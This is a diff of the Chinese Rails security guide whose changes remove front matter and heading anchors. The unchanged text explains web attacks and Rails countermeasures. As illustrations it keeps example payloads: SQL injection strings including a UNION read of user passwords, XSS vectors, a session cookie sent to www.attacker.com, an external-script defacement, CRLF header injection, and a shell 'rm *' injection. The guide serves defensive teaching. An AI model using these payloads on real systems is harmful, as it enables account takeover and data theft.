@@ -1,9 +1,5 @@
----
-layout: docs
-title: Rails 安全指南
-prev_section: testing
-next_section: debugging_rails_applications
----
+Rails 安全指南
+=============
 
 本文介绍网页程序中常见的安全隐患，以及如何在 Rails 中防范。
 
@@ -16,9 +12,9 @@ next_section: debugging_rails_applications
 * 如果管理用户：登录、退出，以及各种攻击方式；
 * 最常见的注入攻击方式；
 
----
+--------------------------------------------------------------------------------
 
-## 简介 {#introduction}
+## 简介
 
 网页程序框架的作用是帮助开发者构建网页程序。有些框架还能增强网页程序的安全性。其实框架之间无所谓谁更安全，只要使用得当，就能开发出安全的程序。Rails 提供了很多智能的帮助方法，例如避免 SQL 注入的方法，可以避免常见的安全隐患。我很欣慰，我所审查的 Rails 程序安全性都很高。
 
@@ -30,11 +26,11 @@ next_section: debugging_rails_applications
 
 为了能开发出安全的网页程序，你必须要了解所用组件的最新安全隐患，做到知己知彼。想了解最新的安全隐患，可以订阅安全相关的邮件列表，阅读关注安全的博客，养成更新和安全检查的习惯。详情参阅“[其他资源](#additional-resources)”一节。我自己也会动手检查，这样才能找到可能引起安全问题的代码。
 
-## 会话 {#sessions}
+## 会话
 
 会话是比较好的切入点，有一些特定的攻击方式。
 
-### 会话是什么 {#what-are-sessions-questionmark}
+### 会话是什么
 
 I> HTTP 是无状态协议，会话让其变成有状态。
 
@@ -48,13 +44,13 @@ session[:user_id] = @current_user.id
 User.find(session[:user_id])
 ~~~
 
-### 会话 ID {#session-id}
+### 会话 ID
 
 I> 会话 ID 是 32 位字节长的 MD5 哈希值。
 
 会话 ID 是一个随机生成的哈希值。这个随机生成的字符串中包含当前时间，0 和 1 之间的随机数字，Ruby 解释器的进程 ID（随机生成的数字），以及一个常量。目前，还无法暴力破解 Rails 的会话 ID。虽然 MD5 很难破解，但却有可能发生同值碰撞。理论上有可能创建完全一样的哈希值。不过，这没什么安全隐患。
 
-### 会话劫持 {#session-hijacking}
+### 会话劫持
 
 W> 窃取用户的会话 ID 后，攻击者就能以该用户的身份使用网页程序。
 
@@ -77,7 +73,7 @@ W> 窃取用户的会话 ID 后，攻击者就能以该用户的身份使用网�
 
 大多数攻击者的动机是获利。[赛门铁克全球互联网安全威胁报告](http://eval.symantec.com/mktginfo/enterprise/white_papers/b-whitepaper_internet_security_threat_report_xiii_04-2008.en-us.pdf)指出，在地下市场，窃取银行账户的价格为 10-1000 美元（视账户余额而定），窃取信用卡卡号的价格为 0.40-20 美元，窃取在线拍卖网站账户的价格为 1-8 美元，窃取 Email 账户密码的价格为 4-30 美元。
 
-### 会话安全指南 {#session-guidelines}
+### 会话安全指南
 
 下面是一些常规的会话安全指南。
 
@@ -85,7 +81,7 @@ W> 窃取用户的会话 ID 后，攻击者就能以该用户的身份使用网�
 
 * **敏感数据不能存储在会话中。**如果用户清除 cookie，或者关闭浏览器，数据就没了。在客户端中存储会话数据，用户还能读取敏感数据。
 
-### 会话存储 {#session-storage}
+### 会话存储
 
 I> Rails 提供了多种存储会话的方式，其中最重要的一个是 `ActionDispatch::Session::CookieStore`。
 
@@ -115,7 +111,7 @@ Rails 以前版本中的 `CookieStore` 使用 `secret_token`，新版中的 `Enc
 
 如果你的程序密令暴露了（例如，程序的源码公开了），强烈建议你更换密令。
 
-### `CookieStore` 存储会话的重放攻击 {#replay-attacks-for-cookiestore-sessions}
+### `CookieStore` 存储会话的重放攻击
 
 T> 使用 `CookieStore` 存储会话时要注意一种叫做“重放攻击”（replay attack）的攻击方式。
 
@@ -131,7 +127,7 @@ T> 使用 `CookieStore` 存储会话时要注意一种叫做“重放攻击”�
 
 避免重放攻击最有力的方式是，不在会话中存储这类数据，将其存到数据库中。针对上例，可以把点数存储在数据库中，把登入用户的 ID 存储在会话中。
 
-### 会话固定攻击 {#session-fixation}
+### 会话固定攻击
 
 I> 攻击者可以不窃取用户的会话 ID，使用一个已知的会话 ID。这叫做“会话固定攻击”（session fixation）
 
@@ -146,7 +142,7 @@ I> 攻击者可以不窃取用户的会话 ID，使用一个已知的会话 ID�
 * 因为伪造的会话 ID 还没用过，所以网页程序要认证用户的身份。
 * 此后，用户和攻击者就可以共用同一个会话访问这个网站了。攻击者伪造的会话 ID 漂白了，而用户浑然不知。
 
-### 会话固定攻击的对策 {#session-fixation-countermeasures}
+### 会话固定攻击的对策
 
 T> 只需一行代码就能避免会话固定攻击。
 
@@ -161,7 +157,7 @@ reset_session
 
 另外一种对策是把用户相关的属性存储在会话中，每次请求都做验证，如果属性不匹配就禁止访问。用户相关的属性可以是 IP 地址或用户代理名（浏览器名），不过用户代理名和用户不太相关。存储 IP 地址时要注意，有些网络服务提供商或者大型组织把用户的真实 IP 隐藏在代理后面，对会话有比较大的影响，所以这些用户可能无法使用程序，或者使用受限。
 
-### 会话过期 {#session-expiry}
+### 会话过期
 
 I> 永不过期的会话增加了跨站请求伪造、会话劫持和会话固定攻击的可能性。
 
@@ -188,7 +184,7 @@ delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
   created_at < '#{2.days.ago.to_s(:db)}'"
 ~~~
 
-## 跨站请求伪造 {#cross-site-request-forgery-csrf}
+## 跨站请求伪造
 
 跨站请求伪造（cross-site request forgery，简称 CSRF）攻击的方法是在页面中包含恶意代码或者链接，攻击者认为被攻击的用户有权访问另一个网站。如果用户在那个网站的会话没有过期，攻击者就能执行未经授权的操作。
 
@@ -207,7 +203,7 @@ delete_all "updated_at < '#{time.ago.to_s(:db)}' OR
 
 CSRF 很少出现在 CVE（通用漏洞披露，Common Vulnerabilities and Exposures）中，2006 年比例还不到 0.1%，但却是个隐形杀手。这倒和我（以及其他人）的安全合约工作得到的结果完全相反——**CSRF 是个严重的安全问题**。
 
-### CSRF 的对策 {#csrf-countermeasures}
+### CSRF 的对策
 
 I> 首先，遵守 W3C 的要求，适时地使用 GET 和 POST 请求。其次，在非 GET 请求中加入安全权标可以避免程序受到 CSRF 攻击。
 
@@ -271,11 +267,11 @@ end
 
 注意，跨站脚本攻击会跳过所有 CSRF 保护措施。攻击者通过跨站脚本可以访问页面中的所有元素，因此能读取表单中的 CSRF 安全权标或者直接提交表单。详情参阅“[跨站脚本](#cross-site-scripting-xss)”一节。
 
-## 重定向和文件 {#redirection-and-files}
+## 重定向和文件
 
 有一种安全漏洞由网页程序中的重定向和文件引起。
 
-### 重定向 {#redirection}
+### 重定向
 
 W> 网页程序中的重定向是个被低估的破坏工具：攻击者可以把用户引到有陷阱的网站，或者制造独立攻击（self-contained attack）。
 
@@ -296,7 +292,7 @@ http://www.example.com/site/legacy?param1=xy&param2=23&host=www.attacker.com
 
 如果 `host` 参数出现在地址的末尾，用户很难察觉，最终被重定向到 attacker.com。对此，一种简单的对策是只允许在 `legacy` 动作中使用指定的参数（使用白名单，而不是删除不该使用的参数）。如果重定向到一个地址，要通过白名单或正则表达式检查目标地址。
 
-#### 独立跨站脚本攻击 {#self-contained-xss}
+#### 独立跨站脚本攻击
 
 还有一种重定向和独立跨站脚本攻击可通过在 Firefox 和 Opera 中使用 data 协议实现。data 协议直接把内容显示在浏览器中，可以包含任何 HTML 或 JavaScript，以及完整的图片：
 
@@ -306,7 +302,7 @@ data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K
 
 这是个使用 Base64 编码的 JavaScript 代码，显示一个简单的弹出窗口。在重定向地址中，攻击者可以通过这段恶意代码把用户引向这个地址。对此，一个对策是禁止用户指定重定向的地址。
 
-### 文件上传 {#file-uploads}
+### 文件上传
 
 I> 确保上传的文件不会覆盖重要的文件，而且要异步处理文件上传过程。
 
@@ -332,7 +328,7 @@ end
 
 所以最好异步处理媒体文件的上传过程：保存媒体文件，然后在数据库中排期一个处理请求，让另一个进程在后台上传文件。
 
-### 上传文件中的可执行代码 {#executable-code-in-file-uploads}
+### 上传文件中的可执行代码
 
 W> 如果把上传的文件存放在特定的文件夹中，其中的源码会被执行。如果 `/public` 文件夹是 Apache 的根目录，就不能把上传的文件保存在这个文件夹里。
 
@@ -340,7 +336,7 @@ W> 如果把上传的文件存放在特定的文件夹中，其中的源码会�
 
 如果 Apache 的 `DocumentRoot` 指向 Rails 的 `/public` 文件夹，请不要把上传的文件放在这个文件夹中， 至少要放在子文件夹中。
 
-### 文件下载 {#file-downloads}
+### 文件下载
 
 I> 确保用户不能随意下载文件。
 
@@ -364,7 +360,7 @@ send_file filename, disposition: 'inline'
 
 另外一种方法是把文件名保存在数据库中，然后用数据库中的 ID 命名存储在硬盘上的文件。这样也能有效避免执行上传文件中的代码。attachment_fu 插件使用的就是类似方式。
 
-## 局域网和管理界面的安全 {#intranet-and-admin-security}
+## 局域网和管理界面的安全
 
 局域网和管理界面是常见的攻击目标，因为这些地方有访问特权。局域网和管理界面需要多种安全防护措施，但实际情况却不理想。
 
@@ -386,7 +382,7 @@ XSS 的对策参阅“[注入](#injection)”一节。在局域网和管理界�
 
 在局域网和管理界面防范 CSRF 的方法参见“[CSRF 的对策](#csrf-countermeasures)”一节。
 
-### 其他预防措施 {#additional-precautions}
+### 其他预防措施
 
 管理界面一般都位于 www.example.com/admin，或许只有 `User` 模型的 `admin` 字段为 `true` 时才能访问。管理界面显示了用户的输入内容，管理员可根据需求删除、添加和编辑数据。我对管理界面的一些想法：
 
@@ -396,7 +392,7 @@ XSS 的对策参阅“[注入](#injection)”一节。在局域网和管理界�
 
 * 把管理界面放到单独的子域名中，例如 admin.application.com，使用独立的程序及用户管理系统。这样就不可能从 www.application.com 中窃取管理密码了，因为浏览器中有同源原则：注入 www.application.com 中的跨站脚本无法读取 admin.application.com 中的 cookie，反之亦然。
 
-## 用户管理 {#user-management}
+## 用户管理
 
 I> 几乎每个网页程序都要处理权限和认证。不要自己实现这些功能，推荐使用常用的插件，而且要及时更新。除此之外还有一些预防措施，可以让程序更安全。
 
@@ -425,7 +421,7 @@ SELECT * FROM users WHERE (users.activation_code IS NULL) LIMIT 1
 
 查询到的是数据库中的第一个用户，返回给动作并登入该用户。详细说明参见[我博客上的文章](http://www.rorsecurity.info/2007/10/28/restful_authentication-login-security/)。因此建议经常更新插件。而且，审查程序的代码也可以发现类似问题。
 
-### 暴力破解账户 {#brute-forcing-accounts}
+### 暴力破解账户
 
 I> 暴力破解需要不断尝试，根据错误提示做改进。提供模糊的错误消息、使用验证码可以避免暴力破解。
 
@@ -437,23 +433,23 @@ I> 暴力破解需要不断尝试，根据错误提示做改进。提供模糊�
 
 为了尽量避免这种攻击，忘记密码页面上显示的错误消息也要模糊一点。如果同一 IP 地址多次登录失败后，还可以要求输入验证码。注意，这种方法不能完全禁止自动化程序，因为自动化程序能频繁更换 IP 地址。不过也算增加了一道防线。
 
-### 盗取账户 {#account-hijacking}
+### 盗取账户
 
 很多程序的账户很容易盗取，为什么不增加盗窃的难度呢？
 
-#### 密码 {#passwords}
+#### 密码
 
 攻击者一旦窃取了用户的会话 cookie 就能进入程序。如果能轻易修改密码，几次点击之后攻击者就能盗用账户。如果修改密码的表单有 CSRF 漏洞，攻击者可以把用户引诱到一个精心制作的网页，其中包含可发起跨站请求伪造的图片。针对这种攻击的对策是，在修改密码的表单中加入 CSRF 防护，而且修改密码前要输入原密码。
 
-#### E-Mail {#e-mail}
+#### E-Mail
 
 攻击者还可通过修改 Email 地址盗取账户。修改 Email 地址后，攻击者到忘记密码页面输入邮箱地址，新密码就会发送到攻击者提供的邮箱中。针对这种攻击的对策是，修改 Email 地址时要输入密码。
 
-#### 其他 {#other}
+#### 其他
 
 不同的程序盗取账户的方式也不同。大多数情况下都要利用 CSRF 和 XSS。例如 [Google Mail](http://www.gnucitizen.org/blog/google-gmail-e-mail-hijack-technique/) 中的 CSRF 漏洞。在这个概念性的攻击中，用户被引向攻击者控制的网站。网站中包含一个精心制作的图片，发起 HTTP GET 请求，修改 Google Mail 的过滤器设置。如果用户登入 Google Mail，攻击者就能修改过滤器，把所有邮件都转发到自己的邮箱中。这几乎和账户被盗的危险性相同。针对这种攻击的对策是，审查程序的逻辑，封堵所有 XSS 和 CSRF 漏洞。
 
-### 验证码 {#captchas}
+### 验证码
 
 I> 验证码是质询-响应测试，用于判断响应是否由计算机生成。经常用在评论表单中，要求用户输入图片中扭曲的文字，禁止垃圾评论机器人发布评论。验证的目的不是为了证明用户是人类，而是为了证明机器人是机器人。
 
@@ -475,7 +471,7 @@ Ned Batchelder 的[博客](http://nedbatchelder.com/text/stopbots.html)中介绍
 
 注意，验证码只能防范自动机器人，不能阻止特别制作的机器人。所以，验证码或许不是登录表单的最佳防护措施。
 
-### 日志 {#logging}
+### 日志
 
 W> 告诉 Rails 不要把密码写入日志。
 
@@ -486,7 +482,7 @@ W> 告诉 Rails 不要把密码写入日志。
 config.filter_parameters << :password
 ~~~
 
-### 好密码 {#good-passwords}
+### 好密码
 
 I> 你是否发现很难记住所有密码？不要把密码记下来，使用容易记住的句子中单词的首字母。
 
@@ -498,7 +494,7 @@ password1, abc123, myspace1, password, blink182, qwerty1, ****you, 123abc, baseb
 
 好的密码是一组很长的字符串，混合字母和数字。这种密码很难记住，建议你使用容易记住的长句的首字母。例如，从“The quick brown fox jumps over the lazy dog”中得到的密码是“Tqbfjotld”。注意，我只是举个例子，请不要使用熟知的名言，因为破解字典中可能有这些名言。
 
-### 正则表达式 {#regular-expressions}
+### 正则表达式
 
 I> 使用 Ruby 正则表达式时经常犯的错误是使用 `^` 和 `$` 分别匹配字符串的开头和结尾，其实应该使用 `\A` 和 `\z`。
 
@@ -543,7 +539,7 @@ validates :content, format: { with: /^Meanwhile$/, multiline: true }
 
 注意，这种方式只能避免格式验证中出现的常见错误。你要牢记，在 Ruby 中 `^` 和 `$` 分别匹配**行**的开头和结尾，不是整个字符串的开头和结尾。
 
-### 权限提升 {#privilege-escalation}
+### 权限提升
 
 W> 只需修改一个参数就可能赋予用户未授权的权限。记住，不管你怎么隐藏参数，还是可能被修改。
 
@@ -565,13 +561,13 @@ W> 只需修改一个参数就可能赋予用户未授权的权限。记住，�
 
 别傻了，隐藏参数或者使用 JavaScript 根本就无安全性可言。使用 Firefox 的开发者工具可以修改表单中的每个隐藏字段。JavaScript 只能验证用户的输入数据，但不能避免攻击者发送恶意请求。Firefox 的 Live Http Headers 插件可以记录每次请求，而且能重复请求或者修改请求内容，很容易就能跳过 JavaScript 验证。有些客户端代理还能拦截任意请求和响应。
 
-## 注入 {#injection}
+## 注入
 
 I> 注入这种攻击方式可以把恶意代码或参数写入程序，在程序所谓安全的环境中执行。常见的注入方式有跨站脚本和 SQL 注入。
 
 注入具有一定技巧性，一段代码或参数在一个场合是恶意的，但换个场合可能就完全无害。这里所说的“场合”可以是一个脚本，查询，编程语言，shell 或者 Ruby/Rails 方法。下面各节分别介绍注入攻击可能发生的场合。不过，首先我们要说明和注入有关的架构决策。
 
-### 白名单 VS. 很名单 {#whitelists-versus-blacklists}
+### 白名单 VS. 很名单
 
 I> 过滤、保护或者验证时白名单比黑名单好。
 
@@ -585,11 +581,11 @@ I> 过滤、保护或者验证时白名单比黑名单好。
 
 使用白名单还能避免忘记黑名单中的内容。
 
-### SQL 注入 {#sql-injection}
+### SQL 注入
 
 I> Rails 中的方法足够智能，能避免 SQL 注入。但 SQL 注入是网页程序中比较常见且危险性高的攻击方式，因此有必要了解一下。
 
-#### 简介 {#sql-injection-introduction}
+#### 简介
 
 SQL 注入通过修改传入程序的参数，影响数据库查询。常见目的是跳过授权管理系统，处理数据或读取任意数据。下面举例说明为什么要避免在查询中使用用户输入的数据。
 
@@ -607,7 +603,7 @@ SELECT * FROM projects WHERE name = '' OR 1 --'
 
 两根横线表明注释开始，后面所有的语句都会被忽略。所以上述查询会读取 `projects` 表中所有记录，包括向用户隐藏的记录。这是因为所有记录都满足查询条件。
 
-#### 跳过授权 {#bypassing-authorization}
+#### 跳过授权
 
 网页程序中一般都有访问控制功能。用户输入登录密令后，网页程序试着在用户数据表中找到匹配的记录。如果找到了记录就赋予用户相应的访问权限。不过，攻击者可通过 SQL 注入跳过这种检查。下面显示了 Rails 中一个常见的数据库查询，在用户表中查询匹配用户输入密令的第一个记录。
 
@@ -625,7 +621,7 @@ SELECT * FROM users WHERE login = '' OR '1'='1' AND password = '' OR '2'>'1' LIM
 
 这个查询直接在数据库中查找第一个记录，然后赋予其相应的权限。
 
-#### 未经授权读取数据 {#unauthorized-reading}
+#### 未经授权读取数据
 
 `UNION` 语句连接两个 SQL 查询，返回的结果只有一个集合。攻击者利用 `UNION` 语句可以从数据库中读取任意数据。下面来看个例子：
 
@@ -652,7 +648,7 @@ SELECT * FROM projects WHERE (name = '') UNION
 
 而且，第二个查询使用 `AS` 语句重命名了某些字段，这样程序就能显示出从用户表中查询得到的数据。
 
-#### 对策 {#sql-injection-countermeasures}
+#### 对策
 
 Rails 内建了能过滤 SQL 中特殊字符的过滤器，会转义 `'`、`"`、`NULL` 和换行符。`Model.find(id)` 和 `Model.find_by_something(something)` 会自动使用这个过滤器。但在 SQL 片段中，尤其是条件语句（`where("...")`），`connection.execute()` 和 `Model.find_by_sql()` 方法，需要手动调用过滤器。
 
@@ -672,11 +668,11 @@ Model.where(login: entered_user_name, password: entered_password).first
 
 数组或 Hash 形式只能在模型实例上使用。其他地方可使用 `sanitize_sql()` 方法。在 SQL 中使用外部字符串时要时刻警惕安全性。
 
-### 跨站脚本 {#cross-site-scripting-xss}
+### 跨站脚本
 
 I> 网页程序中影响范围最广、危害性最大的安全漏洞是跨站脚本。这种恶意攻击方式在客户端注入可执行的代码。Rails 提供了防御这种攻击的帮助方法。
 
-#### 切入点 {#entry-points}
+#### 切入点
 
 切入点是攻击者可用来发起攻击的漏洞 URL 地址和其参数。
 
@@ -688,7 +684,7 @@ I> 网页程序中影响范围最广、危害性最大的安全漏洞是跨站�
 
 一个相对较新、不常见的切入点是横幅广告。[Trend Micro](http://blog.trendmicro.com/myspace-excite-and-blick-serve-up-malicious-banner-ads/) 的文章指出，2008 年早些时候在流行的网站（例如 MySpace 和 Excite）中发现了横幅广告中包含恶意代码。
 
-#### HTML/JavaScript 注入 {#html-javascript-injection}
+#### HTML/JavaScript 注入
 
 跨站脚本最常用的语言当然是使用最广泛的客户端脚本语言 JavaScript，而且经常掺有 HTML。转义用户的输入是最基本的要求。
 
@@ -707,7 +703,7 @@ I> 网页程序中影响范围最广、危害性最大的安全漏洞是跨站�
 <table background="javascript:alert('Hello')">
 ~~~
 
-##### 盗取 cookie {#cookie-theft}
+##### 盗取 cookie
 
 上面的例子没什么危害，下面来看一下攻击者如何盗取用户 cookie（因此也能劫持会话）。在 JavaScript 中，可以使用 `document.cookie` 读写 cookie。JavaScript 强制使用同源原则，即一个域中的脚本无法访问另一个域中的 cookie。`document.cookie` 属性中保存的 cookie 来自源服务器。不过，如果直接把代码放在 HTML 文档中（就跟跨站脚本一样），就可以读写这个属性。把下面的代码放在程序的任何地方，看一下页面中显示的 cookie 值：
 
@@ -731,7 +727,7 @@ GET http://www.attacker.com/_app_session=836c1c25278e5b321d6bea4f19cb57e2
 
 在 cookie 中加上 [httpOnly](http://dev.rubyonrails.org/ticket/8895) 标签可以避免这种攻击，加上 httpOnly 后，JavaScript 就无法读取 `document.cookie` 属性的值。IE v6.SP1、Firefox v2.0.0.5 和 Opera 9.5 都支持只能使用 HTTP 请求访问的 cookie，Safari 还在考虑这个功能，暂时会忽略这个选项。但在其他浏览器，或者旧版本的浏览器（例如 WebTV 和 Mac 系统中的 IE 5.5）中无法加载页面。有一点要注意，使用 [Ajax 仍可读取 cookie](http://ha.ckers.org/blog/20070719/firefox-implements-httponly-and-is-vulnerable-to-xmlhttprequest/)。
 
-##### 涂改 {#defacement}
+##### 涂改
 
 攻击者可通过网页涂改做很多事情，例如，显示错误信息，或者引导用户到攻击者的网站，偷取登录密码或者其他敏感信息。最常见的涂改方法是使用 iframe 加载外部代码：
 
@@ -751,7 +747,7 @@ http://www.cbsnews.com/stories/2002/02/15/weather_local/main501644.shtml?zipcode
   <script src=http://www.securitylab.ru/test/sc.js></script><!--
 ~~~
 
-##### 对策 {#html-javascript-injection-countermeasures}
+##### 对策
 
 I> 过滤恶意输入很重要，转义输出也同样重要。
 
@@ -776,7 +772,7 @@ s = sanitize(user_input, tags: tags, attributes: %w(href title))
 
 而后，还要转义程序的所有输出，尤其是要转义输入时没有过滤的用户输入值（例如前面举过的搜索表单例子）。使用 `escapeHTML()` 方法（或者别名 `h()`）把 HTML 中的 `&`、`"`、`<` 和`>` 字符替换成 `&amp;`、`&quot;`、`&lt;` 和 `&gt;`。不过开发者很容易忘记这么做，所以推荐使用 [SafeErb](http://safe-erb.rubyforge.org/svn/plugins/safe_erb/) 插件，SafeErb 会提醒你转义外部字符串。
 
-##### 编码注入 {#obfuscation-and-encoding-injection}
+##### 编码注入
 
 网络流量大都使用有限的西文字母传输，所以后来出现了新的字符编码方式传输其他语种的字符。这也为网页程序带来了新的威胁，因为恶意代码可以隐藏在不同的编码字符中，浏览器可以处理这些编码，但网页程序不一定能处理。下面是使用 UTF-8 编码攻击的例子：
 
@@ -787,7 +783,7 @@ s = sanitize(user_input, tags: tags, attributes: %w(href title))
 
 上面的代码会弹出一个提示框。`sanitize()` 方法可以识别这种代码。编码字符串的一个好用工具是 [Hackvertor](https://hackvertor.co.uk/public)，使用这个工具可以做到知己知彼。Rails 的 `sanitize()` 方法能有效避免编码攻击。
 
-#### 真实案例 {#examples-from-the-underground}
+#### 真实案例
 
 要想理解现今对网页程序的攻击方式，最好看几个真实案例。
 
@@ -807,7 +803,7 @@ s = sanitize(user_input, tags: tags, attributes: %w(href title))
 
 MySpace Samy 蠕虫在“[CSS 注入](#css-injection)”一节说明。
 
-### CSS 注入 {#css-injection}
+### CSS 注入
 
 I> CSS 注入其实就是 JavaScript 注入，因为有些浏览器（IE，某些版本的 Safari 等）允许在 CSS 中使用 JavaScript。允许在程序中使用自定义的 CSS 时一定要三思。
 
@@ -847,11 +843,11 @@ MySpace 会过滤 `javascript` 这个词，所以蠕虫作者使用 `java<NEWLIN
 
 CSS 中的 [moz-binding](http://www.securiteam.com/securitynews/5LP051FHPE.html) 属性也被证实可在基于 Gecko 的浏览器（例如 Firefox）中把 Javascript 写入 CSS 中。
 
-#### 对策 {#css-injection-countermeasures}
+#### 对策
 
 这个例子再次证明黑名单不能以偏概全。自定义 CSS 在网页程序中是个很少见的功能，因此我也不知道怎么编写 CSS 白名单过滤器。如果想让用户自定义颜色或图片，可以让用户选择颜色或图片，再由网页程序生成 CSS。如果真的需要 CSS 白名单过滤器，可以使用 Rails 的 `sanitize()` 方法。
 
-### Textile 注入 {#textile-injection}
+### Textile 注入
 
 如果想提供 HTML 之外的文本格式化方式（基于安全考虑），可以使用能转换为 HTML 的标记语言。[RedCloth](http://redcloth.org/) 就是一种使用 Ruby 编写的转换工具。使用前要注意，RedCloth 也有跨站脚本漏洞。
 
@@ -879,17 +875,17 @@ RedCloth.new("<a href='javascript:alert(1)'>hello</a>", [:filter_html]).to_html
 # => "<p><a href="javascript:alert(1)">hello</a></p>"
 ~~~
 
-#### 对策 {#textile-injection-countermeasures}
+#### 对策
 
 建议使用 RedCloth 时要同时使用白名单过滤输入值，这一点在应对跨站脚本攻击时已经说过。
 
-### Ajax 注入 {#ajax-injection}
+### Ajax 注入
 
 I> 在常规动作上运用的安全预防措施在 Ajax 动作上也要使用。不过有一个例外：如果动作不渲染视图，在控制器中就要做好转义。
 
 如果使用 [in_place_editor](http://dev.rubyonrails.org/browser/plugins/in_place_editing) 插件，或者动作不渲染视图只返回字符串，就要在动作中转义返回值。否则，如果返回值中包含跨站脚本，发送到浏览器时就会执行。请使用 `h()` 方法转义所有输入值。
 
-### 命令行注入 {#command-line-injection}
+### 命令行注入
 
 I> 使用用户输入的命令行参数时要小心。
 
@@ -903,7 +899,7 @@ system("/bin/echo","hello; rm *")
 # prints "hello; rm *" and does not delete files
 ~~~
 
-### 报头注入 {#header-injection}
+### 报头注入
 
 W> HTTP 报头是动态生成的，某些情况下可能会包含用户注入的值，导致恶意重定向、跨站脚本或者 HTTP 响应拆分（HTTP response splitting）。
 
@@ -939,7 +935,7 @@ Location: http://www.malicious.tld
 
 报头注入就是在报头中注入 CRLF 字符。那么攻击者是怎么进行恶意重定向的呢？攻击者可以把用户重定向到钓鱼网站，要求再次登录，把登录密令发送给攻击者。或者可以利用浏览器的安全漏洞在网站中安装恶意软件。Rails 2.1.2 在 `redirect_to` 方法中转义了传给 `Location` 报头的值。使用用户的输入值构建报头时要手动进行转义。
 
-#### 响应拆分 {#response-splitting}
+#### 响应拆分
 
 既然报头注入有可能发生，响应拆分也有可能发生。在 HTTP 响应中，报头后面跟着两个 CRLF，然后是真正的数据（HTML）。响应拆分的原理是在报头中插入两个 CRLF，后跟其他的响应，包含恶意 HTML。响应拆分示例：
 
@@ -962,7 +958,7 @@ Content-Type: text/html
 
 某些情况下，拆分后的响应会把恶意 HTML 显示给用户。不过这只会在 `Keep-Alive` 连接中发生，大多数浏览器都使用一次性连接。但你不能依赖这一点。不管怎样这都是个严重的隐患，你需要升级到 Rails 最新版，消除报头注入风险（因此也就避免了响应拆分）。
 
-## 生成的不安全查询 {#unsafe-query-generation}
+## 生成的不安全查询
 
 根据 Active Record 处理参数的方式以及 Rack 解析请求参数的方式，攻击者可以通过 `WHERE IS NULL` 子句发起异常数据库查询。为了应对这种安全隐患（[CVE-2012-2660](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/8SA-M3as7A8/Mr9fi9X4kNgJ)，[CVE-2012-2694](https://groups.google.com/forum/#!searchin/rubyonrails-security/deep_munge/rubyonrails-security/jILZ34tAHF4/7x0hLH-o0-IJ) 和 [CVE-2013-0155](https://groups.google.com/forum/#!searchin/rubyonrails-security/CVE-2012-2660/rubyonrails-security/c7jT-EeN9eI/L0u4e87zYGMJ)），Rails 加入了 `deep_munge` 方法，增加安全性。
 
@@ -995,7 +991,7 @@ end
 config.action_dispatch.perform_deep_munge = false
 ~~~
 
-## 默认报头 {#default-headers}
+## 默认报头
 
 Rails 程序返回的每个 HTTP 响应都包含下面这些默认的安全报头：
 
@@ -1034,11 +1030,11 @@ config.action_dispatch.default_headers.clear
 * `Access-Control-Allow-Origin`：设置哪些网站可以不沿用同源原则，发送跨域请求。
 * `Strict-Transport-Security`：设置是否强制浏览器使用[安全连接](http://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security)访问网站。
 
-## 环境相关的安全问题 {#environmental-security}
+## 环境相关的安全问题
 
 增加程序代码和环境安全性的话题已经超出了本文范围。但记住要保护好数据库设置（`config/database.yml`）以及服务器端密令（`config/secrets.yml`）。更进一步，为了安全，这两个文件以及其他包含敏感数据的文件还可使用环境专用版本。
 
-## 其他资源 {#additional-resources}
+## 其他资源
 
 安全漏洞层出不穷，所以一定要了解最新信息，新的安全漏洞可能会导致灾难性的后果。安全相关的信息可从下面的网站获取：
 
